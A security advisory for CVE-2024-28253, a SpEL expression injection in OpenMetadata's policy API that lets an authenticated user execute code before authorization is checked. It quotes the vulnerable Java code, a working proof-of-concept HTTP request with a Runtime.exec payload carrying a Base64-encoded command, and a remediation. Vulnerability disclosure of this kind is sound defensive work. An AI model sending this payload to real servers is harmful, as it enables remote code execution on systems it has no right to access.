# OpenMetadata vulnerable to SpEL Injection in `PUT /api/v1/policies` (`GHSL-2023-252`)

**GHSA**: GHSA-7vf4-x5m2-r6gr | **CVE**: CVE-2024-28253 | **Severity**: critical (CVSS 9.4)

**CWE**: CWE-94

**Affected Packages**:
- **org.open-metadata:openmetadata-service** (maven): < 1.3.1

## Description

### SpEL Injection in `PUT /api/v1/policies` (`GHSL-2023-252`)

**Please note, only authenticated users have access to PUT / POST APIS for /api/v1/policies. Non authenticated users will not be able to access these APIs to exploit the vulnerability** 

`CompiledRule::validateExpression` is also called from [`PolicyRepository.prepare`](https://github.com/open-metadata/OpenMetadata/blob/main/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/PolicyRepository.java#L113)

```java
  @Override
  public void prepare(Policy policy, boolean update) {
    validateRules(policy);
  }
  ...
  public void validateRules(Policy policy) {
    List<Rule> rules = policy.getRules();
    if (nullOrEmpty(rules)) {
      throw new IllegalArgumentException(CatalogExceptionMessage.EMPTY_RULES_IN_POLICY);
    }

    // Validate all the expressions in the rule
    for (Rule rule : rules) {
      CompiledRule.validateExpression(rule.getCondition(), Boolean.class);
      rule.getResources().sort(String.CASE_INSENSITIVE_ORDER);
      rule.getOperations().sort(Comparator.comparing(MetadataOperation::value));

      // Remove redundant resources
      rule.setResources(filterRedundantResources(rule.getResources()));

      // Remove redundant operations
      rule.setOperations(filterRedundantOperations(rule.getOperations()));
    }
    rules.sort(Comparator.comparing(Rule::getName));
  }
```

`prepare()` is called from [`EntityRepository.prepareInternal()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/jdbi3/EntityRepository.java#L693) which, in turn, gets called from the [`EntityResource.createOrUpdate()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/EntityResource.java#L219):

```java
public Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) {
  repository.prepareInternal(entity, true);

  // If entity does not exist, this is a create operation, else update operation
  ResourceContext<T> resourceContext = getResourceContextByName(entity.getFullyQualifiedName());
  MetadataOperation operation = createOrUpdateOperation(resourceContext);
  OperationContext operationContext = new OperationContext(entityType, operation);
  if (operation == CREATE) {
    CreateResourceContext<T> createResourceContext = new CreateResourceContext<>(entityType, entity);
    authorizer.authorize(securityContext, operationContext, createResourceContext);
    entity = addHref(uriInfo, repository.create(uriInfo, entity));
    return new PutResponse<>(Response.Status.CREATED, entity, RestUtil.ENTITY_CREATED).toResponse();
  }
  authorizer.authorize(securityContext, operationContext, resourceContext);
  PutResponse<T> response = repository.createOrUpdate(uriInfo, entity);
  addHref(uriInfo, response.getEntity());
  return response.toResponse();
}
```

Note that even though there is an authorization check (`authorizer.authorize()`), it gets called after `prepareInternal()` gets called and therefore after the SpEL expression has been evaluated.

In order to reach this method, an attacker can send a PUT request to `/api/v1/policies` which gets handled by [`PolicyResource.createOrUpdate()`](https://github.com/open-metadata/OpenMetadata/blob/b6b337e09a05101506a5faba4b45d370cc3c9fc8/openmetadata-service/src/main/java/org/openmetadata/service/resources/policies/PolicyResource.java#L365):

```java
@PUT
@Operation(
    operationId = "createOrUpdatePolicy",
    summary = "Create or update a policy",
    description = "Create a new policy, if it does not exist or update an existing policy.",
    responses = {
      @ApiResponse(
          responseCode = "200",
          description = "The policy",
          content = @Content(mediaType = "application/json", schema = @Schema(implementation = Policy.class))),
      @ApiResponse(responseCode = "400", description = "Bad request")
    })
public Response createOrUpdate(
    @Context UriInfo uriInfo, @Context SecurityContext securityContext, @Valid CreatePolicy create) {
  Policy policy = getPolicy(create, securityContext.getUserPrincipal().getName());
  return createOrUpdate(uriInfo, securityContext, policy);
}
```

This vulnerability was discovered with the help of CodeQL's [Expression language injection (Spring)](https://codeql.github.com/codeql-query-help/java/java-spel-expression-injection/) query.

#### Proof of concept
- Prepare the payload
	- Encode the command to be run (eg: `touch /tmp/pwned`) using Base64 (eg: `dG91Y2ggL3RtcC9wd25lZA==`)
	- Create the SpEL expression to run the system command: `T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode("dG91Y2ggL3RtcC9wd25lZA==")))`
- Send the payload using a valid JWT token:

```http
PUT /api/v1/policies HTTP/1.1
Host: localhost:8585
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
Authorization: Bearer <non-admin JWT>
accept: application/json
Connection: close
Content-Type: application/json
Content-Length: 367

{"name":"TeamOnlyPolicy","rules":[{"name":"TeamOnlyPolicy-Rule","description":"Deny all the operations on all the resources for all outside the team hierarchy..","effect":"deny","operations":["All"],"resources":["All"],"condition":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(T(java.util.Base64).getDecoder().decode('dG91Y2ggL3RtcC9wd25lZA==')))"}]}
```
- Verify that a file called `/tmp/pwned` was created in the OpenMetadata server

#### Impact

This issue may lead to Remote Code Execution by a registered and authenticated user

#### Remediation

Use [`SimpleEvaluationContext`](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html) to exclude *references to Java types, constructors, and bean references*.
